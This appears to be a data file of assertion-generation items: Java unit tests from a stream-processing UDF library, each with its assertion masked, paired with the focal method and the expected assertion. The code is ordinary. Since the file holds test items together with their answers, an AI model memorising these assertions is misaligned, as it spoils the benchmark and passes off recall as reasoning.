"Exception { Object[] objects = new Object[3]; objects[0] = 1L; objects[1] = 2L; objects[2] = 3L; ArrayAggregate arrayAggregate = new ArrayAggregate(); arrayAggregate.open(functionContext); Object result = arrayAggregate.eval(objects, ""average"", ""long""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType longbowArrayType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(longbowArrayType, arrayElements); return arrayProcessor.process(); }"	assertEquals(result, 2d)
"Exception { Object[] objects = new Object[5]; objects[0] = 1L; objects[1] = 1L; objects[2] = 1L; objects[3] = 2L; objects[4] = 3L; ArrayAggregate arrayAggregate = new ArrayAggregate(); arrayAggregate.open(functionContext); Object result = arrayAggregate.eval(objects, ""distinct.average"", ""long""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType longbowArrayType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(longbowArrayType, arrayElements); return arrayProcessor.process(); }"	assertEquals(result, 2d)
"Exception { Object[] objects = new Object[5]; objects[0] = ""a""; objects[1] = ""a""; objects[2] = ""b""; objects[3] = ""v""; objects[4] = ""a""; ArrayAggregate arrayAggregate = new ArrayAggregate(); arrayAggregate.open(functionContext); Object result = arrayAggregate.eval(objects, ""distinct.count"", ""other""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType longbowArrayType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(longbowArrayType, arrayElements); return arrayProcessor.process(); }"	assertEquals(result, 3L)
"shouldRegisterThreeInputArguments() { when(callContext.getDataTypeFactory()).thenReturn(dataTypeFactory); InputTypeStrategy inputTypeStrategy = new ArrayAggregate().getTypeInference(dataTypeFactory).getInputTypeStrategy(); inputTypeStrategy.inferInputTypes(callContext, true); ""<AssertPlaceHolder>""; }
getArgumentCount() { return ConstantArgumentCount.of(ARRAY_AGGREGATE_UDF_FUNCTION_ARG_COUNT); }"	assertEquals(ConstantArgumentCount.of(3), inputTypeStrategy.getArgumentCount())
"Exception { Object[] objects = new Object[]{""a"", ""a"", ""b"", ""v"", ""a""}; ArrayOperate arrayOperate = new ArrayOperate(); arrayOperate.open(functionContext); Object[] objectList = arrayOperate.eval(objects, ""distinct"", ""other""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType dataType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(dataType, arrayElements); return getCopyArray(arrayProcessor.process()); }"	"assertThat(objectList, arrayContainingInAnyOrder(""a"", ""b"", ""v""))"
"Exception { Object[] objects = new Object[]{1, 2, 1, 2, 1}; ArrayOperate arrayOperate = new ArrayOperate(); arrayOperate.open(functionContext); Object[] result = arrayOperate.eval(objects, ""distinct.sorted"", ""int""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType dataType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(dataType, arrayElements); return getCopyArray(arrayProcessor.process()); }"	assertThat(result, arrayContaining(1, 2))
"Exception { Object[] objects = new Object[]{1.3d, 2.1d, 1.3d, 0.1d, 1.3d}; ArrayOperate arrayOperate = new ArrayOperate(); arrayOperate.open(functionContext); Object[] result = arrayOperate.eval(objects, ""distinct.sorted"", ""double""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType dataType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(dataType, arrayElements); return getCopyArray(arrayProcessor.process()); }"	assertThat(result, arrayContaining(0.1d, 1.3d, 2.1d))
"shouldRegisterThreeInputArguments() { when(callContext.getDataTypeFactory()).thenReturn(dataTypeFactory); InputTypeStrategy inputTypeStrategy = new ArrayOperate().getTypeInference(dataTypeFactory).getInputTypeStrategy(); inputTypeStrategy.inferInputTypes(callContext, true); ""<AssertPlaceHolder>""; }
getArgumentCount() { return ConstantArgumentCount.of(ARRAY_OPERATE_UDF_FUNCTION_ARG_COUNT); }"	assertEquals(ConstantArgumentCount.of(3), inputTypeStrategy.getArgumentCount())
"shouldConvertProtoBytesToString() { ByteToString byteToString = new ByteToString(); ByteString byteString = ByteString.copyFrom(""testString"".getBytes(StandardCharsets.UTF_8)); ""<AssertPlaceHolder>""; }
eval(ByteString byteField) { return byteField.toStringUtf8(); }"	"assertEquals(""testString"", byteToString.eval(byteString))"
"shouldConvertProtoBytesToStringForEmptyBytes() { ByteToString byteToString = new ByteToString(); ByteString byteString = ByteString.copyFrom("""".getBytes(StandardCharsets.UTF_8)); ""<AssertPlaceHolder>""; }
eval(ByteString byteField) { return byteField.toStringUtf8(); }"	"assertEquals("""", byteToString.eval(byteString))"
"shouldThrowNullPointerExceptionIfPassedForNullField() { thrown.expect(NullPointerException.class); ByteToString byteToString = new ByteToString(); ""<AssertPlaceHolder>""; }
eval(ByteString byteField) { return byteField.toStringUtf8(); }"	"assertEquals("""", byteToString.eval(null))"
"outputTypeStrategy() { TypeStrategy byteStringOutputStrategy = new ByteToString().getTypeInference(null).getOutputTypeStrategy(); CallContext mockContext = mock(CallContext.class); Optional<DataType> dataType = byteStringOutputStrategy.inferType(mockContext); ""<AssertPlaceHolder>""; verifyZeroInteractions(mockContext); }
inferType(CallContext callContext) { return Optional.of(DataTypes.STRING()); }"	assertEquals(Optional.of(DataTypes.STRING()), dataType)
"shouldReturnTrueWhenFieldValueMatchComparison() { TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().setOrderNumber(""test_order_number_1"").build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval(""order_number"", ""test_order_number_1"");  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertTrue(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldReturnFalseWhenFieldValueDoesntMatchComparison() { TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().setOrderNumber(""test_order_number_1"").build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval(""order_number"", ""test_order_number_2"");  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertFalse(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldBeAbleToAcceptPrimitiveTypeAsComparison() { TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().setAmountPaidByCash(10000f).build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval(""amount_paid_by_cash"", 10000f);  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertTrue(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldBeAbleToCompareNestedFieldName() { Builder timestamp = Timestamp.newBuilder().setSeconds(0000000L); TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().setEventTimestamp(timestamp).build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval(""event_timestamp.seconds"", 0000000L);  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertTrue(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldHandleFieldNameEmpty() { thrown.expectMessage(""Key :  does not exist in Message org.raystack.dagger.consumer.TestBookingLogMessage""); thrown.expect(LongbowException.class); TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval("""", ""arbitrary"");  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertTrue(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldHandleFieldNameDoesNotExist() { thrown.expectMessage(""Key : arbitrary does not exist in Message org.raystack.dagger.consumer.TestBookingLogMessage""); thrown.expect(LongbowException.class); TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval(""arbitrary"", ""arbitrary"");  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertTrue(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldBeAbleToHandleEmptyValue() { TestBookingLogMessage testBookingLog = TestBookingLogMessage.newBuilder().build();  CondEq condEq = new CondEq(); Predicate<DynamicMessage> predicate = condEq.eval(""event_timestamp"", 0L);  ""<AssertPlaceHolder>""; }
test(DynamicMessage message) { MessageParser messageParser = new MessageParser(); List<String> fieldNames = Arrays.asList(fieldName.split(""\\."")); return comparison.equals(messageParser.read(message, fieldNames)); }"	assertFalse(predicate.test(DynamicMessage.newBuilder(testBookingLog).build()))
"shouldReturnHaversineDistanceBetweenParisAndLondon() { double parisLat = 48.8566; double parisLon = 2.3522;  double londonLat = 51.5074; double londonLon = 0.1278;  double distanceInKm = distance.eval(parisLat, parisLon, londonLat, londonLon);  ""<AssertPlaceHolder>""; }
eval(Double latitude1, Double longitude1, Double latitude2, Double longitude2) { double latDistance = degreeToRadian(latitude2 - latitude1); double lonDistance = degreeToRadian(longitude2 - longitude1);  double a = Math.sin(latDistance / 2) * Math.sin(latDistance / 2) + Math.cos(degreeToRadian(latitude1)) * Math.cos(degreeToRadian(latitude2)) * Math.sin(lonDistance / 2) * Math.sin(lonDistance / 2); double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));  return RADIUS_OF_EARTH * c; }"	assertEquals(334.5761379805, distanceInKm, 0.0000000001)
"shouldReturnHaversineDistanceBetweenBangaloreAndJakarta() { double bangaloreLat = 12.9716; double bangaloreLon = 77.5946;  double jakartaLat = 6.1751; double jakartaLon = 106.8650;  double distanceInKm = distance.eval(bangaloreLat, bangaloreLon, jakartaLat, jakartaLon);  ""<AssertPlaceHolder>""; }
eval(Double latitude1, Double longitude1, Double latitude2, Double longitude2) { double latDistance = degreeToRadian(latitude2 - latitude1); double lonDistance = degreeToRadian(longitude2 - longitude1);  double a = Math.sin(latDistance / 2) * Math.sin(latDistance / 2) + Math.cos(degreeToRadian(latitude1)) * Math.cos(degreeToRadian(latitude2)) * Math.sin(lonDistance / 2) * Math.sin(lonDistance / 2); double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));  return RADIUS_OF_EARTH * c; }"	assertEquals(3294.208197583382, distanceInKm, 0.0000000001)
"Exception { ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); routeRow.setField(2, 21.5F);  elementAt.open(functionContext); String actual = elementAt.eval(new Row[]{routeRow}, ""routes"", 0, ""distance_in_kms"");  ""<AssertPlaceHolder>""; }
eval(Row[] array, String pathOfArray, int index, String path) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.entrySet().iterator().next().getValue(); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	assertEquals(String.valueOf(21.5), actual)
"Exception { protos = new LinkedHashMap<>(); protos.put(""data_stream_0"", ""org.raystack.dagger.consumer.TestCustomerLogMessage""); protos.put(""booking"", ""org.raystack.dagger.consumer.TestBookingLogMessage"");  ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); routeRow.setField(2, 21.5F);  elementAt.open(functionContext); String actual = elementAt.eval(new Row[]{routeRow}, ""routes"", 0, ""distance_in_kms"", ""booking"");  ""<AssertPlaceHolder>""; }
eval(Row[] array, String pathOfArray, int index, String path, String tableName) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.get(tableName); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	assertEquals(String.valueOf(21.5), actual)
"Exception { protos = new LinkedHashMap<>(); protos.put(""data_stream_0"", ""org.raystack.dagger.consumer.TestCustomerLogMessage""); protos.put(""booking"", ""org.raystack.dagger.consumer.TestBookingLogMessage"");  ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); routeRow.setField(2, 21.5F);  elementAt.open(functionContext); String actual = elementAt.eval(new Row[]{routeRow}, ""routes"", 0, ""distance_in_kms"");  ""<AssertPlaceHolder>""; }
eval(Row[] array, String pathOfArray, int index, String path) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.entrySet().iterator().next().getValue(); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	"assertEquals("""", actual)"
"Exception { ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); Row locationRow = new Row(4); locationRow.setField(2, CENTRAL_MONUMENT_JAKARTA_LATITUDE); locationRow.setField(3, CENTRAL_MONUMENT_JAKARTA_LONGITUDE); routeRow.setField(0, locationRow);  elementAt.open(functionContext); String actualLatitude = elementAt.eval(new Row[]{routeRow}, ""routes"", 0, ""start.invalid"");  ""<AssertPlaceHolder>"";  }
eval(Row[] array, String pathOfArray, int index, String path) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.entrySet().iterator().next().getValue(); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	"assertEquals("""", actualLatitude)"
"Exception { ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); Row locationRow = new Row(4); locationRow.setField(2, CENTRAL_MONUMENT_JAKARTA_LATITUDE); locationRow.setField(3, CENTRAL_MONUMENT_JAKARTA_LONGITUDE); routeRow.setField(0, locationRow);  elementAt.open(functionContext); String actualLatitude = elementAt.eval(new Row[]{routeRow}, ""routes"", 1, ""start.latitude"");  ""<AssertPlaceHolder>""; }
eval(Row[] array, String pathOfArray, int index, String path) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.entrySet().iterator().next().getValue(); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	"assertEquals("""", actualLatitude)"
"Exception { ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); Row locationRow = new Row(4); locationRow.setField(2, CENTRAL_MONUMENT_JAKARTA_LATITUDE); locationRow.setField(3, CENTRAL_MONUMENT_JAKARTA_LONGITUDE); routeRow.setField(0, locationRow);  elementAt.open(functionContext); String actualLatitude = elementAt.eval(null, ""routes"", 1, ""start.latitude"");  ""<AssertPlaceHolder>""; }
eval(Row[] array, String pathOfArray, int index, String path) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.entrySet().iterator().next().getValue(); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	"assertEquals("""", actualLatitude)"
"Exception { ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); Row routeRow = new Row(3); Row locationRow = new Row(4); locationRow.setField(2, CENTRAL_MONUMENT_JAKARTA_LATITUDE); locationRow.setField(3, CENTRAL_MONUMENT_JAKARTA_LONGITUDE); routeRow.setField(0, locationRow);  elementAt.open(functionContext); String actualLatitude = elementAt.eval(new Row[]{}, ""routes"", 1, ""start.latitude"");  ""<AssertPlaceHolder>""; }
eval(Row[] array, String pathOfArray, int index, String path) { try { if (array == null || array.length <= index) { return """"; } String protoClassName = protos.entrySet().iterator().next().getValue(); MessageReader messageReader = new MessageReader(array[index], protoClassName, pathOfArray, stencilClient); Object value = messageReader.read(path); return String.valueOf(value);  } catch (Exception ignored) {  } return """"; }"	"assertEquals("""", actualLatitude)"
"inputStrategyTypeForTwoArguments() { List<DataType> dataTypeList = new ArrayList<DataType>(5); dataTypeList.add(DataTypes.ARRAY(DataTypes.STRING())); dataTypeList.add(DataTypes.INT()); when(callContext.getArgumentDataTypes()).thenReturn(dataTypeList); InputTypeStrategy inputTypeStrategy = new ElementAt(protos, stencilClientOrchestrator) .getTypeInference(dataTypeFactory) .getInputTypeStrategy(); Optional<List<DataType>> dataTypes = inputTypeStrategy.inferInputTypes(callContext, false); ""<AssertPlaceHolder>""; }
inferInputTypes(CallContext callContext, boolean throwOnFailure) { List<DataType> argumentDataTypes = callContext.getArgumentDataTypes(); int argumentSize = argumentDataTypes.size(); if (argumentSize == MINIMUM_ARG_COUNT) { return Optional.of(callContext.getArgumentDataTypes()); } if (argumentSize == ARG_COUNT_WHEN_SINGLE_TABLE_QUERY) { return Optional.of(Arrays.asList(argumentDataTypes.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING())); } return Optional.of(Arrays.asList(argumentDataTypes.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING(), DataTypes.STRING())); }"	assertEquals(dataTypeList, dataTypes.get())
"inputStrategyTypeForFourArguments() { List<DataType> dataTypeList = new ArrayList<DataType>(5); dataTypeList.add(DataTypes.ARRAY(DataTypes.STRING())); dataTypeList.add(DataTypes.INT()); dataTypeList.add(DataTypes.INT()); dataTypeList.add(DataTypes.INT()); when(callContext.getArgumentDataTypes()).thenReturn(dataTypeList); InputTypeStrategy inputTypeStrategy = new ElementAt(protos, stencilClientOrchestrator) .getTypeInference(dataTypeFactory) .getInputTypeStrategy(); Optional<List<DataType>> dataTypes = inputTypeStrategy.inferInputTypes(callContext, false); ""<AssertPlaceHolder>""; }
inferInputTypes(CallContext callContext, boolean throwOnFailure) { List<DataType> argumentDataTypes = callContext.getArgumentDataTypes(); int argumentSize = argumentDataTypes.size(); if (argumentSize == MINIMUM_ARG_COUNT) { return Optional.of(callContext.getArgumentDataTypes()); } if (argumentSize == ARG_COUNT_WHEN_SINGLE_TABLE_QUERY) { return Optional.of(Arrays.asList(argumentDataTypes.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING())); } return Optional.of(Arrays.asList(argumentDataTypes.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING(), DataTypes.STRING())); }"	assertEquals(Arrays.asList(dataTypeList.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING()), dataTypes.get())
"inputStrategyTypeForFiveArguments() { List<DataType> dataTypeList = new ArrayList<DataType>(5); dataTypeList.add(DataTypes.ARRAY(DataTypes.STRING())); dataTypeList.add(DataTypes.INT()); dataTypeList.add(DataTypes.INT()); dataTypeList.add(DataTypes.INT()); dataTypeList.add(DataTypes.INT()); when(callContext.getArgumentDataTypes()).thenReturn(dataTypeList); InputTypeStrategy inputTypeStrategy = new ElementAt(protos, stencilClientOrchestrator) .getTypeInference(dataTypeFactory) .getInputTypeStrategy(); Optional<List<DataType>> dataTypes = inputTypeStrategy.inferInputTypes(callContext, false); ""<AssertPlaceHolder>""; }
inferInputTypes(CallContext callContext, boolean throwOnFailure) { List<DataType> argumentDataTypes = callContext.getArgumentDataTypes(); int argumentSize = argumentDataTypes.size(); if (argumentSize == MINIMUM_ARG_COUNT) { return Optional.of(callContext.getArgumentDataTypes()); } if (argumentSize == ARG_COUNT_WHEN_SINGLE_TABLE_QUERY) { return Optional.of(Arrays.asList(argumentDataTypes.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING())); } return Optional.of(Arrays.asList(argumentDataTypes.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING(), DataTypes.STRING())); }"	assertEquals(Arrays.asList(dataTypeList.get(0), DataTypes.STRING(), DataTypes.INT(), DataTypes.STRING(), DataTypes.STRING()), dataTypes.get())
"outputTypeStrategy() { ElementAt elementAt = new ElementAt(protos, stencilClientOrchestrator); TypeInference typeInference = elementAt.getTypeInference(dataTypeFactory); TypeStrategy outputTypeStrategy = typeInference.getOutputTypeStrategy(); Optional<DataType> dataType = outputTypeStrategy.inferType(callContext); ""<AssertPlaceHolder>""; }
inferType(CallContext callContext) { return Optional.of(DataTypes.STRING()); }"	assertEquals(DataTypes.STRING(), dataType.get())
"shouldReturnLastDateOfMonthForGivenTimestampInIST() { long startOfMonthTimestamp = endOfMonth.eval(Long.parseLong(""1562224758""), ""Asia/Kolkata""); ""<AssertPlaceHolder>""; }
eval(Long seconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_MONTH, cal.getActualMaximum(Calendar.DAY_OF_MONTH));  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1564597799""), startOfMonthTimestamp)"
"shouldReturnLastDateOfMonthForGivenTimestampInUTC() { long startOfMonthTimestamp = endOfMonth.eval(Long.parseLong(""1562224758""), ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long seconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_MONTH, cal.getActualMaximum(Calendar.DAY_OF_MONTH));  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1564617599""), startOfMonthTimestamp)"
"shouldReturnLastDateOfMonthForGivenTimestampInWIB() { long startOfMonthTimestamp = endOfMonth.eval(Long.parseLong(""1562224758""), ""Asia/Jakarta""); ""<AssertPlaceHolder>""; }
eval(Long seconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_MONTH, cal.getActualMaximum(Calendar.DAY_OF_MONTH));  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1564592399""), startOfMonthTimestamp)"
"shouldTimestampAtEarliestGivenDayIST() { long earliestTimestamp = endOfWeek.eval(Long.parseLong(""1562224758000""), ""Asia/Kolkata""); ""<AssertPlaceHolder>""; }
eval(Long milliSeconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliSeconds));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek()); cal.add(Calendar.DATE, DAY_SPAN);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1562524199999""), earliestTimestamp)"
"shouldTimestampAtEarliestGivenDayWIB() { long earliestTimestamp = endOfWeek.eval(Long.parseLong(""1562224758000""), ""Asia/Jakarta""); ""<AssertPlaceHolder>""; }
eval(Long milliSeconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliSeconds));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek()); cal.add(Calendar.DATE, DAY_SPAN);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1562518799999""), earliestTimestamp)"
"shouldTimestampAtEarliestGivenDayUTC() { long earliestTimestamp = endOfWeek.eval(Long.parseLong(""1562224758000""), ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long milliSeconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliSeconds));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek()); cal.add(Calendar.DATE, DAY_SPAN);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1562543999999""), earliestTimestamp)"
"shouldTimestampAtEarliestGivenDayUTCWithEventTimestampIsSundayDayStart() { long earliestTimestamp = endOfWeek.eval(Long.parseLong(""1561939200000""), ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long milliSeconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliSeconds));  cal.set(Calendar.HOUR_OF_DAY, END_OF_DAY_HOUR); cal.set(Calendar.MINUTE, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.SECOND, END_OF_DAY_MINUTE_AND_SECOND); cal.set(Calendar.MILLISECOND, MAX_MILLISECONDS); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek()); cal.add(Calendar.DATE, DAY_SPAN);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1562543999999""), earliestTimestamp)"
"shouldReturnCaulculation() { SortedMap<Double, Double> positionSortedValues = new TreeMap<>(); double window = 6; double alpha = 0.2; //long timeInMillis = System.currentTimeMillis();  positionSortedValues.put(0.0, 7.0); positionSortedValues.put(3.0, 3.0); positionSortedValues.put(4.0, 4.0); positionSortedValues.put(5.0, 1.0);  ""<AssertPlaceHolder>""; }
calculateEMA(SortedMap<Double, Double> positionSortedValues, Double window, Double alpha) { double emaSum = 0; for (Map.Entry<Double, Double> lagValue : positionSortedValues.entrySet()) { Double position = lagValue.getKey(); Double value = lagValue.getValue();  if (position == window - 1) { emaSum += value * Math.pow(1 - alpha, position); } else { emaSum += value * alpha * Math.pow(1 - alpha, position); } }  return emaSum; }"	assertEquals(2.36256, ExponentialMovingAverage.calculateEMA(positionSortedValues, window, alpha), 0.0000001)
"shouldReturnCorrectSortedValues() { ArrayList<Timestamp> timestampsArray = new ArrayList<>(); ArrayList<Object> valuesArray = new ArrayList<Object>();  long timeInMillis = System.currentTimeMillis(); Timestamp hopStartTime = new Timestamp(timeInMillis);  double window = 6.0;  timestampsArray.add(new Timestamp(timeInMillis)); timestampsArray.add(new Timestamp(timeInMillis + 60000)); timestampsArray.add(new Timestamp(timeInMillis + 120000)); timestampsArray.add(new Timestamp(timeInMillis + 300000));  valuesArray.add(1.0); valuesArray.add(4.0); valuesArray.add(3.0); valuesArray.add(7.0);  SortedMap<Double, Double> expected = new TreeMap<>(); expected.put(0.0, 7.0); expected.put(3.0, 3.0); expected.put(4.0, 4.0); expected.put(5.0, 1.0);  ""<AssertPlaceHolder>""; }
sortValuesByTime(Timestamp hopStartTime, Double window, List<Timestamp> timestampsArray, ArrayList<Object> valuesArray) { SortedMap<Double, Double> positionSortedValues = new TreeMap<>(); int i;  for (i = 0; i < timestampsArray.size(); i++) { Timestamp startTime = timestampsArray.get(i); double value = (double) valuesArray.get(i);  double position = getPosition(startTime, hopStartTime, window);  positionSortedValues.put(position, value); }  return positionSortedValues; }"	assertEquals(expected, ExponentialMovingAverage.sortValuesByTime(hopStartTime, window, timestampsArray, valuesArray))
"shouldReturnCorrectPosition() { long timeInMillis = System.currentTimeMillis(); Timestamp startTime = new Timestamp(timeInMillis + 180000); Timestamp hopStartTime = new Timestamp(timeInMillis); double window = 6.0;  ""<AssertPlaceHolder>""; }
